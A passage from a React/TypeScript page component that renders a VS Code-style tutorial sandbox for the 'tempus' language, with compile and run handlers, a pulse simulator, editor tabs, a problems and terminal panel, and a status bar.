  // ── on file switch: reset sim, default to the lesson tab ──────────────────
  useEffect(() => {
    stopLoop();
    setEvents([]);
    setOutTab("lesson");
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [activeTab]);

  // ── splitter drag ─────────────────────────────────────────────────────────
  useEffect(() => {
    const move = (e: MouseEvent) => {
      if (!dragging.current || !splitRef.current) return;
      const r = splitRef.current.getBoundingClientRect();
      const pct = ((e.clientX - r.left) / r.width) * 100;
      setEditorWidth(Math.min(78, Math.max(28, pct)));
    };
    const up = () => { dragging.current = false; document.body.style.cursor = ""; };
    window.addEventListener("mousemove", move);
    window.addEventListener("mouseup", up);
    return () => { window.removeEventListener("mousemove", move); window.removeEventListener("mouseup", up); };
  }, []);

  // ── actions ───────────────────────────────────────────────────────────────
  const log = useCallback((line: string) => setTermLog(p => [...p, line].slice(-200)), []);

  const handleCompile = useCallback(() => {
    stopLoop();
    if (activeLang !== "tempus") { log(`$ tempus compile ${activeName} — not a .tempus file`); return; }
    const res = compile(source);
    setResult(res);
    const e = res.diagnostics.filter(d => d.severity === "error").length;
    const w = res.diagnostics.filter(d => d.severity === "warning").length;
    log(`$ tempus compile ${activeName} → ${res.ok ? "ok" : "FAILED"} (${e} error${e !== 1 ? "s" : ""}, ${w} warning${w !== 1 ? "s" : ""})`);
    setOutTab("diagnostics");
    setPanelTab("problems");
  }, [activeLang, activeName, source, stopLoop, log]);

  const handleRun = useCallback(() => {
    stopLoop();
    if (activeLang !== "tempus" || !activeLesson) { log(`$ tempus run ${activeName} — open a lesson script to run`); return; }
    const res = compile(source);
    setResult(res);
    if (!res.ok || !res.runtime) {
      log(`$ tempus run ${activeName} → blocked: fix ${res.diagnostics.filter(d => d.severity === "error").length} error(s) first`);
      setOutTab("diagnostics"); setPanelTab("problems"); return;
    }
    setEvents([]);
    const total = activeLesson.events;
    const batch = Math.max(1, Math.floor(total / 40));
    const ch0 = res.registry?.channels[0] ?? "";
    const freq = res.runtime.syncs.get(ch0)?.freq ?? 10e6;
    setRunMeta({ name: activeName, events: total, noise: activeLesson.noise, seed: 42, freq });
    simRef.current = createSimulator(res.runtime, { totalEvents: total, noiseSigma: activeLesson.noise, seed: 42, batchSize: batch });
    log(`$ tempus run ${activeName} → simulating ${total} pulses on ${res.registry?.channels.length} channel(s)…`);
    setOutTab("output");
    setRunning(true);
    intervalRef.current = setInterval(() => {
      const sim = simRef.current;
      if (!sim || sim.isDone()) { stopLoop(); return; }
      sim.generateBatch();
      setEvents(sim.getEvents().slice());
    }, 40);
  }, [activeLang, activeLesson, activeName, source, stopLoop, log]);

  // ── tree / tab ops ──────────────────────────────────────────────────────────
  const toggleFolder = useCallback((key: string) => {
    setExpanded((prev) => { const n = new Set(prev); n.has(key) ? n.delete(key) : n.add(key); return n; });
  }, []);
  const openFile = useCallback((pathArr: string[]) => {
    const key = pathArr.join("/");
    setOpenTabs((prev) => (prev.some((t) => t.join("/") === key) ? prev : [...prev, pathArr]));
    setActiveTab(key);
  }, []);
  const closeTab = useCallback((key: string, e: any) => {
    e.stopPropagation();
    setOpenTabs((prev) => {
      const next = prev.filter((t) => t.join("/") !== key);
      if (activeTab === key) setActiveTab(next.length ? next[next.length - 1].join("/") : null);
      return next;
    });
    setDirty((prev) => { const n = new Set(prev); n.delete(key); return n; });
  }, [activeTab]);
  const updateContent = useCallback((val: string) => {
    if (!activePathArr) return;
    setFiles((prev) => { const next = cloneTree(prev); getNode(next, activePathArr).content = val; return next; });
    setDirty((prev) => new Set(prev).add(activeTab as string));
  }, [activePathArr, activeTab]);

  // ── derived simulation data ─────────────────────────────────────────────────
  const palette = useMemo(() => paletteFor(result?.runtime ? Array.from(result.runtime.cells.keys()) : []), [result]);
  const derived = useMemo<SimDerived | null>(() => {
    if (!result?.runtime) return null;
    const cells = Array.from(result.runtime.cells.values());
    const recent = events.slice(-400);
    const bands: ScatterBand[] = cells.map(c => ({ label: c.name, lo: c.lo, hi: c.hi, color: palette.get(c.name) ?? "#888" }));
    const histBands: HistBand[] = cells.map(c => ({ lo: c.lo, hi: c.hi, color: palette.get(c.name) ?? "#888" }));
    return {
      bands, histBands,
      points: recent.map(ev => ({ y: ev.dp, color: (palette.get(ev.cell) ?? ANOMALY) + (ev.actionFired ? "" : "a0"), r: ev.actionFired ? 3 : 1.8 })),
      strip: recent.map(ev => ({ color: ev.phase === "EXECUTE" ? "#f59e0b" : "#60a5fa", opacity: ev.phase === "EXECUTE" ? 0.85 : 0.4 })),
      hist: events.map(e => e.dp),
      log: events.filter(e => e.actionFired !== null).slice(-40).reverse().map(e => ({ cell: e.cell, action: e.actionFired as string, dp: e.dp, color: palette.get(e.cell) ?? ANOMALY })),
      stats: { total: events.length, dispatched: events.filter(e => e.actionFired !== null).length, anomalies: events.filter(e => e.cell === "anomaly").length },
    };
  }, [events, result, palette]);

  const diags = result?.diagnostics ?? [];
  const errCount = diags.filter(d => d.severity === "error").length;
  const warnCount = diags.filter(d => d.severity === "warning").length;

  const activities = [
    { id: "files", Icon: Files, label: "Explorer" },
    { id: "search", Icon: Search, label: "Search" },
    { id: "git", Icon: GitBranch, label: "Source Control" },
    { id: "run", Icon: Play, label: "Run and Debug" },
    { id: "ext", Icon: Blocks, label: "Extensions" },
  ];

  return (
    <div className="flex h-screen w-full flex-col overflow-hidden text-sm" style={{ background: theme.editor, color: theme.editorFg }}>
      <Head><title>Tempus · Tutorial</title></Head>

      {/* Title bar */}
      <div className="flex h-9 shrink-0 items-center justify-between px-3" style={{ background: theme.titlebar }}>
        <div className="flex items-center gap-2">
          <span className="h-3 w-3 rounded-full" style={{ background: "#ff5f56" }} />
          <span className="h-3 w-3 rounded-full" style={{ background: "#ffbd2e" }} />
          <span className="h-3 w-3 rounded-full" style={{ background: "#27c93f" }} />
        </div>
        <span className="text-xs tracking-wider" style={{ color: theme.statusFg }}>TEMPUS — tutorial sandbox</span>
        <Link href="/" className="text-[11px]" style={{ color: "rgba(255,255,255,0.35)", textDecoration: "none" }}>← home</Link>
      </div>

      <div className="flex min-h-0 flex-1">
        {/* Activity bar */}
        <div className="flex w-12 shrink-0 flex-col items-center justify-between py-2" style={{ background: theme.activitybar }}>
          <div className="flex flex-col items-center gap-1">
            {activities.map(({ id, Icon, label }) => {
              const active = activity === id;
              return (
                <button key={id} title={label}
                  onClick={() => { if (active) setSidebar((s) => !s); else { setActivity(id); setSidebar(true); } }}
                  className="relative flex h-11 w-12 items-center justify-center transition-colors"
                  style={{ color: active ? theme.activitybarFgActive : theme.activitybarFg }}>
                  {active && <span className="absolute left-0 top-1/2 h-6 w-0.5 -translate-y-1/2" style={{ background: theme.accentBright }} />}
                  <Icon size={23} strokeWidth={1.5} />
                </button>
              );
            })}
          </div>
          <button title="Settings" className="flex h-11 w-12 items-center justify-center" style={{ color: theme.activitybarFg }}>
            <Settings size={23} strokeWidth={1.5} />
          </button>
        </div>

        {/* Sidebar */}
        {sidebar && (
          <div className="flex w-60 shrink-0 flex-col overflow-hidden" style={{ background: theme.sidebar, borderRight: `1px solid ${theme.border}` }}>
            <div className="flex h-9 shrink-0 items-center px-4 text-[11px] font-medium uppercase tracking-wider" style={{ color: theme.sidebarHeader }}>
              {activities.find((a) => a.id === activity)?.label}
            </div>
            <div className="min-h-0 flex-1 overflow-y-auto pb-2">
              {activity === "files" ? (
                <Tree tree={files} expanded={expanded} toggle={toggleFolder} activePath={activeTab} openFile={openFile} />
              ) : (
                <div className="px-4 py-6 text-[13px]" style={{ color: theme.tabFg }}>{activities.find((a) => a.id === activity)?.label}</div>
              )}
            </div>
          </div>
        )}

        {/* Editor + Output split */}
        <div ref={splitRef} className="flex min-w-0 flex-1">
          {/* Editor column */}
          <div className="flex min-w-0 flex-col" style={{ width: `${editorWidth}%` }}>
            <div className="flex h-9 shrink-0 items-stretch overflow-x-auto" style={{ background: theme.tabInactive }}>
              {openTabs.map((pathArr) => {
                const key = pathArr.join("/");
                const name = pathArr[pathArr.length - 1];
                const active = key === activeTab;
                const isDirty = dirty.has(key);
                const { Icon, color } = fileIcon(name);
                return (
                  <div key={key} onClick={() => setActiveTab(key)}
                    className="group flex cursor-pointer items-center gap-2 border-r px-3 text-[13px]"
                    style={{ background: active ? theme.tabActive : theme.tabInactive, color: active ? theme.tabFgActive : theme.tabFg, borderColor: theme.border, borderTop: active ? `1px solid ${theme.accentBright}` : "1px solid transparent" }}>
                    <Icon size={15} style={{ color }} />
                    <span className="whitespace-nowrap">{name}</span>
                    <button onClick={(e) => closeTab(key, e)} className="flex h-5 w-5 items-center justify-center rounded" style={{ color: active ? theme.tabFgActive : theme.tabFg }}>
                      {isDirty ? <Circle size={9} fill="currentColor" className="group-hover:hidden" /> : null}
                      <X size={15} className={isDirty ? "hidden group-hover:block" : "opacity-0 group-hover:opacity-100"} />
                    </button>
                  </div>
                );
              })}
            </div>

            {activePathArr && (
              <div className="flex h-6 shrink-0 items-center gap-1 px-4 text-[12px]" style={{ background: theme.editor, color: theme.tabFg }}>
                {activePathArr.map((p, i) => (
                  <span key={i} className="flex items-center gap-1">{i > 0 && <ChevronRight size={12} className="opacity-60" />}{p}</span>
                ))}
              </div>
            )}

            {activeNode ? (
              <Editor value={activeNode.content} onChange={updateContent} onCursor={setCursor} />
            ) : (
              <div className="flex min-h-0 flex-1 items-center justify-center text-sm" style={{ background: theme.editor, color: "#4a5d58" }}>Select a file to start editing</div>
            )}

            {panel && (
              <div className="flex h-36 shrink-0 flex-col" style={{ background: theme.panel, borderTop: `1px solid ${theme.border}` }}>
                <div className="flex h-9 items-center justify-between pr-2">
                  <div className="flex h-full items-center">
                    {([["problems", "Problems"], ["terminal", "Terminal"]] as const).map(([id, label]) => {
                      const active = panelTab === id;
                      return (
                        <button key={id} onClick={() => setPanelTab(id)} className="relative h-full px-3 text-[11px] font-medium uppercase tracking-wider transition-colors" style={{ color: active ? theme.tabFgActive : theme.tabFg }}>
                          {label}{id === "problems" && diags.length > 0 ? ` (${diags.length})` : ""}
                          {active && <span className="absolute bottom-0 left-0 h-0.5 w-full" style={{ background: theme.accentBright }} />}
                        </button>
                      );
                    })}
                  </div>
                  <button onClick={() => setPanel(false)} style={{ color: theme.tabFg }} title="Close panel"><PanelBottomClose size={16} /></button>
                </div>
                <div className="min-h-0 flex-1 overflow-y-auto px-3 pb-3 font-mono text-[12px] leading-relaxed">
                  {panelTab === "terminal" ? (
                    <div style={{ color: theme.editorFg }}>
                      {termLog.map((l, i) => (
                        <div key={i} style={{ color: l.startsWith("$") ? "#9cdcfe" : l.includes("FAILED") || l.includes("blocked") ? "#f48771" : "rgba(255,255,255,0.55)" }}>{l}</div>
                      ))}
                    </div>
                  ) : diags.length === 0 ? (
                    <div className="flex items-center gap-2 pt-1" style={{ color: "#6a9955" }}><Check size={14} /> No problems detected.</div>
                  ) : (
                    <div className="pt-1">
                      {diags.map((d, i) => {
                        const s = SEV[d.severity]; const lc = posToLineCol(source, d.pos);
                        return (
                          <div key={i} className="flex items-start gap-2 py-0.5" style={{ color: "rgba(255,255,255,0.7)" }}>
                            <span style={{ color: s.color }}>{s.glyph}</span>
                            <span>{d.message}{lc ? `  [${lc.line}:${lc.col}]` : ""}</span>
                          </div>
                        );
                      })}
                    </div>
                  )}
                </div>
              </div>
            )}
          </div>

          {/* Splitter */}
          <div onMouseDown={() => { dragging.current = true; document.body.style.cursor = "col-resize"; }}
            className="w-1 shrink-0 cursor-col-resize" style={{ background: theme.border }} title="Drag to resize" />

          {/* Output column */}
          <OutputColumn tab={outTab} setTab={setOutTab} lesson={activeLesson} readme={activeLang === "md" ? source : null}
            events={events} runMeta={runMeta}
            derived={derived} showPhase={activeLesson?.feature === "phase"} result={result} src={source}
            diagCount={diags.length} cellCount={result?.registry?.cells.length ?? 0}
            onCompile={handleCompile} onRun={handleRun} running={running} />
        </div>
      </div>

      {/* Status bar */}
      <div className="flex h-6 shrink-0 items-center justify-between px-3 text-[12px]" style={{ background: theme.statusBar, color: theme.statusFg }}>
        <div className="flex items-center gap-3">
          <button className="flex items-center gap-1" onClick={() => setPanel((p) => !p)}><GitBranch size={13} /> main</button>
          <span className="flex items-center gap-2">
            <span className="flex items-center gap-1"><X size={13} /> {errCount}</span>
            <span className="flex items-center gap-1"><AlertCircle size={13} /> {warnCount}</span>
          </span>
          {result?.registry && <span style={{ opacity: 0.85 }}>d = {result.registry.channels.length} · {result.registry.cells.length} cells</span>}
        </div>
        <div className="flex items-center gap-3">
          <span>Ln {cursor.ln}, Col {cursor.col}</span>
          <span>Spaces: 2</span><span>UTF-8</span>
          <span>{activeNode ? langLabel(activeLang) : "—"}</span>
          <Bell size={13} />
        </div>
      </div>
    </div>
  );
}

TempusTutorial.getLayout = (page: React.ReactElement) => page;
export default TempusTutorial;
